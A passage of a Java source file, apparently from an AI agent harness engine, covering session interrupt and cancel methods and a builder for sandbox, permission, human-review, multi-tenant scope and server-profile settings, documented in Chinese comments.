     * }
     * }</pre>
     *
     * <p>宿主取流只有一条路径：{@code outcome.getRequest().stream()}。回执读
     * {@code outcome.getCommandOutput()}，两者的先后顺序与订阅时机均由宿主掌握
     * （各端时序要求不同：CLI 即时写终端、Web 要求流门复位早于回执、桌面需要序号回放）。</p>
     *
     * @param input 输入上下文（含命令上下文工厂，为空时使用缓冲式默认实现）
     */
    public InputOutcome handle(HarnessInput input) {
        return inputPipeline.handle(input);
    }



    /**
     * 中断会话当前正在执行的任务（程序化 /interrupt）。
     *
     * <p>收敛此前只存在于 {@code /interrupt} 命令里的内部细节：回调扩展的中断参与（如积压插件清待执行项）、
     * 释放运行流句柄、补写取消消息（带 runId 元数据）与快照。
     * {@code /interrupt} 命令也走本方法，不存在第二套中断逻辑。</p>
     *
     * <p><b>先清积压再停流</b>：{@link HarnessExtension#onSessionInterrupt} 保证在认领/停流之前回调。
     * 停流后宿主常在终态回调里续发队首，顺序颠倒会把刚被停掉的任务重新推起来。</p>
     *
     * <pre>{@code
     * if (engine.interrupt(session)) {
     *     engine.handle(HarnessInput.of(session, "改用 PostgreSQL 方言重写迁移脚本"));
     * }
     * }</pre>
     *
     * @return true = 已中断；false = 当前无正在执行的任务（会话为 null 时也返回 false）
     */
    public boolean interrupt(@Nullable AgentSession session) {
        InterruptPlan plan = prepareInterrupt(session);
        return plan != null && plan.commit();
    }

    /**
     * 两段式中断的第一段：扩展中断参与（清积压等）+ 原子认领运行句柄（不停流、不写取消消息）。
     *
     * <p>给需要自定义终态时序的宿主（如 Web 的「先落库 → error → done → 最后停流」）留出
     * 编排窗口；编排完调用 {@link InterruptPlan#commit()} 提交。不需要自定义时序的宿主
     * 继续用 {@link #interrupt(AgentSession)} 即可（等价于 prepare + commit）。</p>
     *
     * <p>计划必须闭合：用 try-with-resources 持有，或确保任何路径上都调
     * {@link InterruptPlan#close()}（与 commit 等价且幂等）——忘记闭合会留下一条
     * 无法再次取消的孤儿流。</p>
     *
     * <pre>{@code
     * try (InterruptPlan plan = engine.prepareInterrupt(session)) {
     *     if (plan == null || !plan.hasActiveRun()) { emitFallbackDone(); return; }
     *     emitError(cancelText);
     *     emitDone();
     *     plan.commit();
     * }
     * }</pre>
     *
     * @return 中断计划；null 仅当会话为 null。无活跃流时返回 {@code hasActiveRun()==false}
     *         的计划（积压与取消代数已处理，宿主走空态出口）
     * @since 4.2.0
     */
    @Nullable
    public InterruptPlan prepareInterrupt(@Nullable AgentSession session) {
        return sessionControl.prepareInterrupt(session);
    }

    /**
     * 程序级取消：只停当前运行流并推进取消代数，不补取消消息、不清积压。
     *
     * <p>三个停流入口：{@link #interrupt(AgentSession)}（用户停止：扩展参与 + 写取消消息 + 停流）、
     * 本方法（程序取消：停流 + 推进代数）、{@link #preemptStream(AgentSession)}（腾位：只停流，不推进代数）。</p>
     *
     * <p>与 {@link #interrupt(AgentSession)} 的差别仅在于<b>不写历史</b>：适合轮次由程序接管、
     * 后续会重新发起新一轮的场景（如自动循环的上一轮被新目标顶掉）。这类场景若补写取消消息，
     * 会在会话历史里留下「用户已取消」的假象，与真实的用户取消混淆。</p>
     *
     * <p>返回 {@code false} 同样不代表什么都没发生：取消代数依然推进（见
     * {@link HarnessInterrupts#cancelStream(AgentSession)}）。</p>
     *
     * @return true = 确有运行中的流被停掉；false = 调用时没有已登记的活跃流
     * @since 4.2.0
     */
    public boolean cancelStream(@Nullable AgentSession session) {
        return HarnessInterrupts.cancelStream(session);
    }

    /**
     * 为新一轮腾位：只停当前运行流，不推进取消代数（新轮次顶掉旧轮次用）。
     *
     * <p>与 {@link #cancelStream(AgentSession)} 的差别在于「这次停流算不算取消」：
     * 推进代数后，被顶掉的旧流能据此判定自己是被取消的、不再发终态帧（适合 Stop）；
     * 不推进代数则适合「新一轮腾位」——旧流本该自然结束，若当成被取消会把新一轮收尾牵连进去。</p>
     *
     * @return true = 确有活跃流被停掉
     * @since 4.2.0
     */
    public boolean preemptStream(@Nullable AgentSession session) {
        return HarnessInterrupts.preemptStream(session);
    }

    /**
     * 读取会话运行态快照（核心事实 + 各扩展贡献的事实，一次读全）
     *
     * <p>宿主的「能不能接新输入」判定需要同时看运行流、挂起卡、积压等多项。读一次快照即可，不要自己拼。
     * 核心事实由 {@link SessionStatus#builder} 读定，扩展事实由 {@link HarnessExtension#contributeSessionStatus} 贡献
     * （按插件自定义的 {@link SessionStatus.Key} 读取，如 {@code QueueExtension.STATUS_PENDING}）。</p>
     *
     * <p>只想问「现在能不能注入一轮程序任务」用 {@link #isIdle(AgentSession)}，不要自己拼。</p>
     *
     * @since 4.2.0
     */
    public SessionStatus status(@Nullable AgentSession session) {
        return sessionControl.status(session);
    }

    /**
     * 会话是否完全空闲（可以注入一轮程序任务）。
     *
     * <p>口径：不占用（无运行流、不在受理窗口、无待审批卡，即 {@link SessionStatus#isOccupied()} 为假）
     * <b>且</b>没有任何积压能力报告待执行输入（{@link InputBacklog#hasPending}）——有积压时注入等于插队。
     * 两项在同一把会话锁内读取，结果一致。</p>
     *
     * <p>给 goal 调度、宿主定时任务等「程序代替用户发起一轮」的场景做预判用；
     * 真正的受理仍在 {@link #handle(HarnessInput)} 第 0 步（忙时程序轮次得到 {@code REJECTED("busy")}）。</p>
     *
     * @return session 为 null 时返回 false（无从注入）
     * @since 4.2.0
     */
    public boolean isIdle(@Nullable AgentSession session) {
        return sessionControl.isIdle(session);
    }


    /**
     * 输入是否为「忙碌可穿透」的斜杠命令。
     *
     * <p>宿主的受理控制需要回答「这条输入能不能在任务运行中被受理」。答案不该由宿主
     * 复刻「解析命令名 → 查注册表 → 读 terminalOnly/runnableWhenBusy」这条链——
     * 三处口径任一漂移（前缀、大小写、参数切分），忙态旁路就会静默失效。
     * 本方法把该判定收归引擎，宿主只需一个布尔。</p>
     *
     * <p>判定口径：输入以引擎命令前缀开头、能解析出命令名、且该命令已注册、
     * 非 {@link Command#terminalOnly()} 且声明 {@link Command#runnableWhenBusy()}。</p>
     *
     * <p><b>注意</b>：本方法只回答「忙态是否放行」，不回答「空闲时能否启动任务」。
     * 后者（如 {@code /steer}）仍由宿主按自己的占位闩语义处理。</p>
     *
     * @see Command#runnableWhenBusy()
     * @since 4.2.0
     */
    public boolean isBusyBypassCommand(@Nullable String input) {
        return sessionControl.isBusyBypassCommand(input);
    }

    /**
     * 解析输入对应的已注册命令（未以命令前缀开头、只有前缀、或未注册时返回 null）。
     *
     * <p>宿主在忙态/空闲态之间分流前常需先知道「这是不是一条命令」，
     * 但不应自行解析前缀与参数。命名/前缀口径的唯一实现留在引擎侧。</p>
     *
     * @since 4.2.0
     */
    @Nullable
    public Command resolveCommand(@Nullable String input) {
        return sessionControl.resolveCommand(input);
    }

    public static Builder of(String workspace, String harnessHome) {
        return new Builder(workspace, harnessHome);
    }

    public static class Builder {
        private final HarnessOptions options;
        /** 预设在 build() 时合成；显式设过的字段不被预设覆盖 */
        private HarnessProfile profile;
        private final Set<String> explicit = new HashSet<>();

        private Builder explicit(String field, Object value) {
            if (value != null) {
                explicit.add(field);
            }
            return this;
        }

        public Builder(String workspace, String harnessHome) {
            this.options = new HarnessOptions(workspace, harnessHome);
        }

        // ========== 服务注入（代理到 options） ==========

        public Builder sessionProvider(AgentSessionProvider sessionProvider) {
            options.setSessionProvider(sessionProvider);
            return this;
        }

        /**
         * 人工介入拦截器
         */
        public Builder hitlInterceptor(HITLInterceptor hitlInterceptor) {
            options.setHitlInterceptor(hitlInterceptor);
            return this;
        }

        /**
         * 心智记忆存储方案
         */
        public Builder memoryProvider(MemorySolutionProvider memoryProvider) {
            options.setMemoryProvider(memoryProvider);
            return this;
        }

        // ========== 简单属性配置（代理到 options） ==========

        public Builder systemPrompt(String systemPrompt) {
            options.setSystemPrompt(systemPrompt);
            return this;
        }

        public Builder userAgent(String userAgent) {
            options.setUserAgent(userAgent);
            return this;
        }

        /**
         * 引擎级代理（host/port 形式），构建期配置。
         *
         * @since 4.0.5
         */
        public Builder httpProxy(String host, int port) {
            options.setHttpProxy(new Proxy(Proxy.Type.HTTP, new InetSocketAddress(host, port)));
            return this;
        }

        /**
         * 引擎级代理（java.net.Proxy 形式），构建期配置；传 null 表示直连。
         *
         * @since 4.0.5
         */
        public Builder httpProxy(Proxy proxy) {
            options.setHttpProxy(proxy);
            return this;
        }

        /**
         * 引擎级 http 定制钩子（每次 LLM 请求创建 HttpUtils 后执行，可覆盖/追加 proxy、header、timeout 等）。
         *
         * @since 4.0.5
         */
        public Builder httpCustomizeAdd(Consumer<HttpUtils> httpCustomize) {
            options.addHttpCustomize(httpCustomize);
            return this;
        }

        public Builder httpCustomizeSet(Consumer<HttpUtils> httpCustomize) {
            options.setHttpCustomize(httpCustomize);
            return this;
        }

        public Builder maxTurns(Integer maxTurns) {
            options.setMaxTurns(maxTurns);
            return this;
        }

        /**
         * 受理占位时限（毫秒，缺省 60000）。
         *
         * <p>{@code handle} 返回 TASK 时会话被占位，直到请求开流（{@code stream()} 被订阅）或
         * {@code call()} 结束。宿主拿到 TASK 却始终不开流（且没有 {@code discard()}）时，超过时限的占位不再算占用，
         * 会话不会被永久卡住。</p>
         *
         * @since 4.2.0
         */
        public Builder admissionTimeoutMs(Long admissionTimeoutMs) {
            options.setAdmissionTimeoutMs(admissionTimeoutMs);
            return this;
        }

        public Builder autoRethink(Boolean autoRethink) {
            options.setAutoRethink(autoRethink);
            return this;
        }

        public Builder sessionWindowSize(Integer sessionWindowSize) {
            options.setSessionWindowSize(sessionWindowSize);
            return this;
        }

        public Builder compressionThreshold(Integer maxMessages, Double maxContextRatio) {
            options.setCompressionMaxMessages(maxMessages);
            options.setCompressionMaxContextRatio(maxContextRatio);
            return this;
        }

        public Builder compressionDefaultContextLength(Long defaultContextLength) {
            options.setCompressionDefaultContextLength(defaultContextLength);
            return this;
        }

        public Builder compressionInterceptor(ContextCompressionInterceptor compressionInterceptor) {
            options.setCompressionInterceptor(compressionInterceptor);
            return this;
        }

        public Builder stopLoopInterceptor(StopLoopInterceptor stopLoopInterceptor) {
            options.setStopLoopInterceptor(stopLoopInterceptor);
            return this;
        }

        public Builder cacheControl(CacheControl cacheControl) {
            options.setCacheControl(cacheControl);
            return this;
        }

        public Builder memoryEnabled(Boolean memoryEnabled) {
            options.setMemoryEnabled(memoryEnabled);
            return this;
        }

        /**
         * 记忆注入：按对话内容语义匹配的条数（默认 6）。小窗口模型建议 3-4，大窗口建议 8-10。
         */
        public Builder memoryRelevanceCount(int n) {
            options.setMemoryRelevanceCount(n);
            return this;
        }

        /**
         * 记忆注入：按重要度兜底的条数（默认 5）。
         */
        public Builder memoryPriorityCount(int n) {
            options.setMemoryPriorityCount(n);
            return this;
        }

        /**
         * 记忆 listAll 视图的摘要截断长度（默认 80）。
         */
        public Builder memorySummaryLength(int n) {
            options.setMemorySummaryLength(n);
            return this;
        }

        public Builder sandboxEnabled(Boolean sandboxEnabled) {
            options.setSandboxEnabled(sandboxEnabled);
            return explicit("sandboxEnabled", sandboxEnabled);
        }

        public Builder sandboxAllowUserHome(Boolean sandboxAllowUserHome) {
            options.setSandboxAllowUserHome(sandboxAllowUserHome);
            return explicit("sandboxAllowUserHome", sandboxAllowUserHome);
        }

        public Builder sandboxSystemRestrict(Boolean sandboxSystemRestrict) {
            options.setSandboxSystemRestrict(sandboxSystemRestrict);
            return explicit("sandboxSystemRestrict", sandboxSystemRestrict);
        }

        // ========== 权限系统 ==========

        /**
         * 添加权限规则
         */
        public Builder permissionRuleAdd(PermissionRule rule) {
            options.updatePermissionContext(ctx -> ctx.addRule(rule));
            return this;
        }

        public Builder hitlEnabled(Boolean hitlEnabled) {
            options.setHitlEnabled(hitlEnabled);
            return this;
        }

        public Builder subagentEnabled(Boolean subagentEnabled) {
            options.setSubagentEnabled(subagentEnabled);
            return this;
        }

        /**
         * 子代理任务默认并发上限（默认 5，取值 1~{@link TaskTalent#MAX_CONCURRENCY}；
         * 0 = 未设置即取默认，超出上界按上界处理，<b>不存在「不限制」</b>）
         *
         * <p>仅在模型未配置 {@code AiConfig#concurrency} 时生效；模型配了就以模型为准。</p>
         */
        public Builder subagentDefaultConcurrency(Integer subagentDefaultConcurrency) {
            options.setSubagentDefaultConcurrency(subagentDefaultConcurrency);
            return this;
        }

        public Builder bashAsyncEnabled(Boolean bashAsyncEnabled) {
            options.setBashAsyncEnabled(bashAsyncEnabled);
            return explicit("bashAsyncEnabled", bashAsyncEnabled);
        }

        public Builder apiRetries(Integer apiRetries) {
            options.setApiRetries(apiRetries);
            return this;
        }

        public Builder mcpRetries(Integer mcpRetries) {
            options.setMcpRetries(mcpRetries);
            return this;
        }

        public Builder modelRetries(Integer modelRetries) {
            options.setModelRetries(modelRetries);
            return this;
        }

        // ========== 集合类配置（代理到 options） ==========

        public Builder toolsAdd(ToolName... tools) {
            options.addTools(tools);
            return this;
        }

        public Builder toolsAdd(Collection<String> tools) {
            options.getTools().addAll(tools);
            return this;
        }

        public Builder disallowedToolsAdd(ToolName... tools) {
            options.addDisallowedTools(tools);
            return this;
        }

        public Builder disallowedToolsAdd(Collection<String> tools) {
            options.getDisallowedTools().addAll(tools);
            return this;
        }

        /** 挂载扩展（构建期；同一实例重复添加只算一次，null 忽略） */
        public Builder extensionAdd(HarnessExtension val) {
            if (val != null && containsSame(options.getExtensions(), val) == false) {
                options.getExtensions().add(val);
            }
            return this;
        }

        public Builder modelAdd(ChatConfig val) {
            options.addModel(val);
            return this;
        }

        public Builder modelAdd(Iterable<ChatConfig> models) {
            for (ChatConfig val : models) {
                options.addModel(val);
            }
            return this;
        }

        /**
         * harness 状态数据来源（默认 {@code <workspace>/<harnessHome>} 本地目录）。
         *
         * <p>可替换为 db / http 等任意 {@link MountSource}，实现算存分离；它不注册进挂载表，模型不可见。</p>
         *
         * @since 4.2.0
         */
        public Builder stateSource(MountSource stateSource) {
            options.setStateSource(stateSource);
            return this;
        }

        public Builder mountAdd(Mount mount) {
            if (mount != null && BUILTIN_AGENT_MOUNT.equals(normalizeMountAlias(mount.getAlias()))) {
                throw new IllegalArgumentException("Built-in mount cannot be replaced: " + BUILTIN_AGENT_MOUNT);
            }
            options.mountManager.register(mount);
            return this;
        }

        public Builder commandAdd(Command command) {
            options.commandRegistry.register(command);
            return this;
        }

        public Builder commandLoad(MountSource source, String dir) {
            options.commandRegistry.load(source, dir);
            return this;
        }

        public Builder mcpServerAdd(String name, McpServerParameters params) {
            options.getMcpServers().put(name, params);
            return this;
        }

        public Builder apiServerAdd(String name, ApiSource source) {
            options.getApiServers().put(name, source);
            return this;
        }

        public Builder lspServerAdd(String name, LspServerParameters lspServer) {
            options.getLspServers().put(name, lspServer);
            return this;
        }

        public Builder defaultModel(String defaultModel) {
            options.setDefaultModel(defaultModel);
            return this;
        }

        /**
         * 命令前缀（默认 "/"），支持多字符（如 "::"）
         */
        public Builder commandPrefix(String commandPrefix) {
            options.setCommandPrefix(commandPrefix);
            return this;
        }

        /**
         * 子代理提及前缀（默认 "@"），支持多字符（如 "#"）
         */
        public Builder agentPrefix(String agentPrefix) {
            options.setAgentPrefix(agentPrefix);
            return this;
        }

        // ========== 多租户 / 服务端 ==========

        /**
         * 运行模式预设（在 {@code build()} 时合成一组缺省值；显式 setter 优先，与调用顺序无关）
         *
         * @since 4.2.0
         */
        public Builder profile(HarnessProfile profile) {
            this.profile = profile;
            return this;
        }

        /**
         * 记忆是否按会话隔离（CODING 缺省 false，SERVER 缺省 true）
         *
         * @since 4.2.0
         */
        public Builder memorySessionIsolation(boolean memorySessionIsolation) {
            options.setMemorySessionIsolation(memorySessionIsolation);
            return explicit("memorySessionIsolation", memorySessionIsolation);
        }

        /**
         * 是否由引擎自行初始化进程级 OS 沙盒（CODING 缺省 true；SERVER 缺省 false，宿主启动时
         * 调用一次 {@code SandboxBootstrap.initOnce}）。网络白名单是进程级的，不按引擎区分。
         *
         * @since 4.2.0
         */
        public Builder sandboxSelfBootstrap(boolean sandboxSelfBootstrap) {
            options.setSandboxSelfBootstrap(sandboxSelfBootstrap);
            return explicit("sandboxSelfBootstrap", sandboxSelfBootstrap);
        }

        /**
         * 运行期是否允许修改引擎级全局配置（工具、模型、MCP、沙盒、HITL 开关）。
         * CODING 缺省 true；SERVER 缺省 false：这些修改会影响共用本引擎的所有用户。
         *
         * @since 4.2.0
         */
        public Builder runtimeMutable(boolean runtimeMutable) {
            options.setRuntimeMutable(runtimeMutable);
            return explicit("runtimeMutable", runtimeMutable);
        }

        /**
         * 会话工作目录边界策略：{@link HarnessEngine#setSessionCwd} 不满足时抛 {@link SecurityException}。
         * 会话 cwd 会被加进文件工具根与 OS 沙盒写白名单，多租户下必须限制在租户根目录内。
         *
         * @since 4.2.0
         */
        public Builder cwdPolicy(Predicate<String> cwdPolicy) {
            options.setCwdPolicy(cwdPolicy);
            return this;
        }

        /**
         * 请求级作用域解析器：每次受理的输入（含 goal / loop / queue 的程序输入）都会解析一次，
         * 输入已显式携带作用域时不调用。作用域只能收窄，且是强制边界（见 {@link InputScope}）。
         *
         * @since 4.2.0
         */
        public Builder scopeResolver(InputScopeResolver scopeResolver) {
            options.setScopeResolver(scopeResolver);
            return this;
        }

        /**
         * 是否要求每轮都有作用域（SERVER 缺省 true）。开启后：解析器返回 null 或抛异常时
         * {@code handle} 返回 {@code REJECTED} + {@code InputOutcome.REJECT_SCOPE_UNAVAILABLE}；
         * 绕过受理的请求（如已废弃的 {@code prompt(...)}）由守卫禁用全部工具（时钟除外）。
         *
         * @since 4.2.0
         */
        public Builder scopeRequired(boolean scopeRequired) {
            options.setScopeRequired(scopeRequired);
            return explicit("scopeRequired", scopeRequired);
        }

        /**
         * 会话归属（多节点部署的单写者租约；缺省 {@link SessionOwnership#LOCAL}）。
         * 非持有节点上的受理返回 {@code REJECTED} + {@code InputOutcome.REJECT_NOT_OWNER}。
         *
         * @since 4.2.0
         */
        public Builder sessionOwnership(SessionOwnership sessionOwnership) {
            options.setSessionOwnership(sessionOwnership);
            return this;
        }

        /**
         * 受保护的状态子路径（相对 harnessHome，缺省 sessions / memory / channels / tasks.json / loop / goal）：
         * 模型的文件工具与 bash 都不得读写。传空列表表示不保护。
         *
         * @since 4.2.0
         */
        public Builder protectedStatePaths(List<String> protectedStatePaths) {
            options.setProtectedStatePaths(protectedStatePaths);
            return this;
        }

        /**
         * 全局子代理持久化策略：{@code generate(saveToFile=true)} 会把子代理写进工作区代理目录、对本引擎所有会话可见，
         * 按本策略判定是否允许（缺省：runtimeMutable 为 true 时允许，即 CODING 允许、SERVER 拒绝）。
         * 不持久化的（{@code saveToFile=false}）只对创建它的会话可见，不受本策略约束。
         *
         * <pre>{@code
         * .agentPersistPolicy((session, def) -> admins.contains(engine.getSessionPrincipal(session)))
         * }</pre>
         *
         * @since 4.2.0
         */
        public Builder agentPersistPolicy(BiPredicate<AgentSession, AgentDefinition> agentPersistPolicy) {
            options.setAgentPersistPolicy(agentPersistPolicy);
            return this;
        }

        /**
         * 子代理（task / multitask）执行器。缺省为引擎私有、线程上限 {@code TaskTalent.DEFAULT_MAX_THREADS}；
         * 引擎池场景建议注入一个进程级共享的有界池，避免线程数随租户数线性增长。
         * <b>注入的执行器生命周期归宿主</b>，引擎 {@code shutdown} 不会关闭它。执行器拒绝提交时，
         * 已启动的 worker 继续消化剩余子任务，全部被拒时子任务按「未启动」返回给模型。
         *
         * @since 4.2.0
         */
        public Builder taskExecutor(ExecutorService taskExecutor) {
            options.setTaskExecutor(taskExecutor);
            return this;
        }

        public HarnessEngine build() {
            Objects.requireNonNull(options.getSessionProvider(), "sessionProvider");
            options.applyProfile(profile, explicit);
            if (options.getProfile() == HarnessProfile.SERVER) {
                validateServerProfile(options);
            }

            HarnessEngine engine = new HarnessEngine(options);

            for (HarnessExtension extension : options.getExtensions()) {
                extension.onAttach(engine);
            }

            // 运行期不可改全局配置时，注册表在扩展挂载完成后封口（绕过 getter 直接注册同样被拒绝）
            if (options.isRuntimeMutable() == false) {
                options.commandRegistry.seal();
                engine.agentManager.seal();
            }

            return engine;
        }

        /**
         * SERVER 模式的快速失败校验（把「第一次请求才发现」的配置错误提前到构建期）
         */
        static void validateServerProfile(HarnessOptions options) {
            MountSource state = options.getStateSourceOrNull();
            if (state == null) {
                throw new IllegalStateException("SERVER profile requires an explicit stateSource "
                        + "outside the workspace (e.g. db / <data>/<tenant>)");
            }
            Path stateRoot = state.getLocalRoot().orElse(null);
            if (stateRoot != null && Assert.isNotEmpty(options.getWorkspace())) {
                Path ws = Paths.get(options.getWorkspace()).toAbsolutePath().normalize();
                Path sr = stateRoot.toAbsolutePath().normalize();
                if (sr.startsWith(ws)) {
                    throw new IllegalStateException("SERVER profile requires stateSource outside the workspace: " + sr);
                }
            }
            if (options.getModels().isEmpty()) {
                throw new IllegalStateException("SERVER profile requires at least one model: call modelAdd(...)");
            }
            if (Assert.isNotEmpty(options.getDefaultModel()) && !options.hasModel(options.getDefaultModel())) {
                throw new IllegalStateException("defaultModel not found: " + options.getDefaultModel());
            }
            SessionOwnership ownership = options.getSessionOwnership();
            if (ownership != SessionOwnership.LOCAL && !(ownership instanceof SessionOwnership.Namespaced)) {
                LOG.warn("[Harness] SERVER profile with a shared SessionOwnership without namespace: "
                        + "sessions of different tenants with the same id will contend for one lease. "
                        + "Wrap it with SessionOwnership.namespaced(tenantId, delegate)");
            }
            if (!options.isSandboxEnabled() || !options.isSandboxSystemRestrict()) {
                LOG.warn("[Harness] SERVER profile with OS sandbox relaxed (sandboxEnabled={}, sandboxSystemRestrict={})",
                        options.isSandboxEnabled(), options.isSandboxSystemRestrict());
            }
        }
    }
}